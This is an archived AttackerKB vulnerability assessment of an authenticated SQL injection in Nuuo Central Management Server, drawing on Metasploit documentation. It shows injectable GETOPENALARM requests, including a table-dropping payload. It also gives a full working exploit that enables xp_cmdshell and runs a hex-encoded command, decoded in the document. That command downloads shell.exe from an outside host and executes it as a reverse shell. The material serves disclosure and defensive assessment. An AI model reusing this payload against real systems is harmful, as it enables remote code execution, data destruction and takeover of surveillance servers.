---
title: Nuuo Central Management Server Authenticated SQL Server SQLi
author: jrobles-r7
score: 1
topic_attacker_value: 3
topic_exploitability: 2
topic_disclosure_date: '2018-11-27T20:29:00'
created: '2019-05-09T17:57:43.123841'
revision_date: '2020-03-15T04:22:22.595044'
assessment_id: 5b35da11-af2c-4c12-b5c9-75b404d1b39d
topic_id: 18ccbd5b-9aa6-4591-ba7f-c6c0827fc9b2
topic_short_id: qo45Dhyzbz
topic_slug: nuuo-central-management-server-authenticated-sql-server-sqli
akb_topic_url: https://attackerkb.com/topics/qo45Dhyzbz/nuuo-central-management-server-authenticated-sql-server-sqli
akb_assessment_url: https://attackerkb.com/topics/qo45Dhyzbz/nuuo-central-management-server-authenticated-sql-server-sqli#5b35da11-af2c-4c12-b5c9-75b404d1b39d
author_ratings:
  attacker-value: 3
  confidence-in-ratings: 3
  exploitability: 2
  offensive-application: not sure
  urgent-to-patch: 4
---

# Nuuo Central Management Server Authenticated SQL Server SQLi

*Assessment by jrobles-r7, archived from [AttackerKB](https://attackerkb.com/topics/qo45Dhyzbz/nuuo-central-management-server-authenticated-sql-server-sqli#5b35da11-af2c-4c12-b5c9-75b404d1b39d).*

---

## Details

Details from [module documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/nuuo/nuuo_cms_sqli.md) in Metasploit.

The GETOPENALARM verb is used to obtain information about alarms stored in the CMS Server database. An example request is below:

```
GETOPENALARM NUCM/1.0
DeviceID: <number>
SourceServer: <server-id>
LastOne: <number>
```

The vulnerability is in the "SourceServer" parameter, which allows injection of arbitrary SQL characters, and can be abused to inject SQL into the executing statement. For example the following request:

```
GETOPENALARM NUCM/1.0
DeviceID: 1
SourceServer: ';drop table bobby;--
LastOne: 3
```

Will cause the following SQL query to be executed on the server:
SELECT AlarmNo, EventType, DeviceID, Channel, EventDesc, DateTime, PreviewImage, SourceServer, AlarmID, State, Priority, Owner, HistoryNo, PosTransaction, AlarmNote, AlarmType FROM AlarmLog WHERE DeviceID=1 AND SourceServer='';drop table bobby;-- ' AND State<20 order by DateTime DESC

Given that SQL Server 2005 Express is used by default (see vulnerability #2), this can be abused to enable xp_cmdshell and achieve remote code execution.

As as example, here is a full working exploit that downloads a reverse shell from http://10.0.99.102/shell.exe and executes it:

```
';exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'xp_cmdshell', 1; reconfigure; declare @q varchar(8000); select @q=0x78705f636d647368656c6c2027636420433a5c77696e646f77735c74656d705c202626206563686f202473746f726167654469723d24707764203e20776765742e707331202626206563686f2024776562636c69656e74203d204e65772d4f626a6563742053797374656d2e4e65742e576562436c69656e74203e3e20776765742e707331202626206563686f202475726c203d2022687474703a2f2f31302e302e39392e3130322f7368656c6c2e65786522203e3e20776765742e707331202626206563686f202466696c65203d20227368656c6c2e65786522203e3e20776765742e707331202626206563686f2024776562636c69656e742e446f776e6c6f616446696c65282475726c2c2466696c6529203e3e20776765742e70733120262620706f7765727368656c6c2e657865202d457865637574696f6e506f6c69637920427970617373202d4e6f4c6f676f202d4e6f6e496e746572616374697665202d4e6f50726f66696c65202d46696c6520776765742e70733120262620636d64202f6320433a5c77696e646f77735c74656d705c7368656c6c2e65786527; exec (@q);--
```

The encoded part of the exploit is the following:

```
xp_cmdshell 'cd C:\windows\temp\ && echo $storageDir=$pwd > wget.ps1 && echo $webclient = New-Object System.Net.WebClient >> wget.ps1 && echo $url = "http://10.0.99.102/shell.exe" >> wget.ps1 && echo $file = "shell.exe" >> wget.ps1 && echo $webclient.DownloadFile($url,$file) >> wget.ps1 && powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 && cmd /c C:\windows\temp\shell.exe'
```
